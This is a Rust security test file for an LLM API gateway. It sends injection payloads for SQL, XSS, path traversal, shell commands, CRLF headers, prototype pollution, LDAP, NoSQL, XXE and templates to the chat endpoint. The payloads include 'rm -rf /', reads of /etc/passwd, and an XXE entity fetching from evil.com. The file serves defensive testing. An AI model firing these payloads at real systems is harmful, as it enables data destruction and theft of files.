// Injection prevention security tests
use crate::tests::helpers;
use axum::http::StatusCode;
use serde_json::Value;

#[tokio::test]
async fn test_injection_prevention_basic() {
    let server = helpers::create_test_server().await;
    
    // Basic injection prevention test
    let request = helpers::create_test_chat_request("gpt-3.5-turbo", "Injection prevention test");
    let response = server
        .post("/v1/chat/completions")
        .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
        .add_header("Content-Type", "application/json")
        .json(&request)
        .await;
    
    // Should prevent injection appropriately
    assert!(response.status_code().is_success() || response.status_code().is_server_error());
}

#[tokio::test]
async fn test_injection_prevention_sql_injection() {
    let server = helpers::create_test_server().await;
    
    // Test SQL injection attempts
    let sql_injection_payloads = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "'; UPDATE users SET password='hacked'; --",
        "'; SELECT * FROM users WHERE id=1; --",
    ];
    
    for payload in sql_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle SQL injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
        
        // Should not crash or expose sensitive data
        if response.status_code().is_server_error() {
            let body: Value = response.json();
            let error_message = body["error"]["message"].as_str().unwrap_or("");
            assert!(!error_message.contains("SQL") || error_message.len() < 1000);
        }
    }
}

#[tokio::test]
async fn test_injection_prevention_xss() {
    let server = helpers::create_test_server().await;
    
    // Test XSS attempts
    let xss_payloads = vec![
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
    ];
    
    for payload in xss_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle XSS attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
        
        // Response should not contain unescaped script tags
        if response.status_code().is_success() {
            let body = response.text();
            assert!(!body.contains("<script>"));
            assert!(!body.contains("javascript:"));
        }
    }
}

#[tokio::test]
async fn test_injection_prevention_path_traversal() {
    let server = helpers::create_test_server().await;
    
    // Test path traversal attempts
    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
    ];
    
    for payload in path_traversal_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle path traversal attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_command_injection() {
    let server = helpers::create_test_server().await;
    
    // Test command injection attempts
    let command_injection_payloads = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& ls -la",
        "`whoami`",
        "$(id)",
        "; echo 'hacked' > /tmp/test",
    ];
    
    for payload in command_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle command injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_header_injection() {
    let server = helpers::create_test_server().await;
    
    // Test header injection attempts
    let header_injection_payloads = vec![
        ("X-Forwarded-For", "192.168.1.1\r\nX-Forwarded-For: 10.0.0.1"),
        ("User-Agent", "Mozilla/5.0\r\nX-Forwarded-For: 10.0.0.1"),
        ("Content-Type", "application/json\r\nX-Forwarded-For: 10.0.0.1"),
        ("Authorization", "ApiKey sk-ultrafast-gateway-key\r\nX-Forwarded-For: 10.0.0.1"),
    ];
    
    for (header_name, header_value) in header_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", "Header injection test");
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .add_header(header_name, header_value)
            .json(&request)
            .await;
        
        // Should handle malicious headers safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_json_injection() {
    let server = helpers::create_test_server().await;
    
    // Test JSON injection attempts
    let json_injection_payloads = vec![
        r#"{"model": "gpt-3.5-turbo", "messages": [{"role": "user", "content": "test"}], "extra": {"__proto__": {"admin": true}}}"#,
        r#"{"model": "gpt-3.5-turbo", "messages": [{"role": "user", "content": "test"}], "constructor": {"prototype": {"admin": true}}}"#,
        r#"{"model": "gpt-3.5-turbo", "messages": [{"role": "user", "content": "test"}], "toString": "function() { return 'hacked'; }"}"#,
    ];
    
    for payload in json_injection_payloads {
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .body(payload)
            .await;
        
        // Should handle JSON injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error() || response.status_code().is_client_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_ldap_injection() {
    let server = helpers::create_test_server().await;
    
    // Test LDAP injection attempts
    let ldap_injection_payloads = vec![
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "*)(|(objectClass=*))",
        "admin)(&(password=*))",
        "*)(|(cn=*))",
    ];
    
    for payload in ldap_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle LDAP injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_nosql_injection() {
    let server = helpers::create_test_server().await;
    
    // Test NoSQL injection attempts
    let nosql_injection_payloads = vec![
        "'; return true; var x='",
        "'; return false; var x='",
        "'; while(true){}; var x='",
        "'; db.users.find(); var x='",
        "'; db.users.drop(); var x='",
    ];
    
    for payload in nosql_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle NoSQL injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_xml_injection() {
    let server = helpers::create_test_server().await;
    
    // Test XML injection attempts
    let xml_injection_payloads = vec![
        "<![CDATA[<script>alert('xss')</script>]]>",
        "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
        "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><test>&xxe;</test>",
        "<![CDATA[<script>alert('xss')</script>]]>",
    ];
    
    for payload in xml_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle XML injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_template_injection() {
    let server = helpers::create_test_server().await;
    
    // Test template injection attempts
    let template_injection_payloads = vec![
        "{{7*7}}",
        "{{config}}",
        "{{request}}",
        "{{self}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${7*7}",
        "#{7*7}",
    ];
    
    for payload in template_injection_payloads {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", payload);
        let response = server
            .post("/v1/chat/completions")
            .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
            .add_header("Content-Type", "application/json")
            .json(&request)
            .await;
        
        // Should handle template injection attempts safely
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
}

#[tokio::test]
async fn test_injection_prevention_metrics_under_injection_pressure() {
    let server = helpers::create_test_server().await;
    
    // Test metrics under injection prevention pressure
    let start = std::time::Instant::now();
    let mut handles = vec![];
    
    let injection_payloads = vec![
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "; rm -rf /",
        "{{7*7}}",
    ];
    
    for (i, payload) in injection_payloads.iter().enumerate() {
        let request = helpers::create_test_chat_request("gpt-3.5-turbo", &format!("Injection pressure test {}: {}", i, payload));
        let server_clone = server.clone();
        
        let handle = tokio::spawn(async move {
            server_clone
                .post("/v1/chat/completions")
                .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
                .add_header("Content-Type", "application/json")
                .json(&request)
                .await
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests to complete
    for handle in handles {
        let response = handle.await.unwrap();
        assert!(response.status_code().is_success() || response.status_code().is_server_error());
    }
    
    let duration = start.elapsed();
    
    // Should complete within reasonable time even under injection prevention pressure
    assert!(duration.as_millis() < 60000); // 1 minute max
    
    // Check metrics endpoint under injection prevention pressure
    let metrics_response = server
        .get("/metrics")
        .add_header("Authorization", "ApiKey sk-ultrafast-gateway-key")
        .await;
    
    assert!(metrics_response.status_code().is_success() || metrics_response.status_code().is_server_error());
}
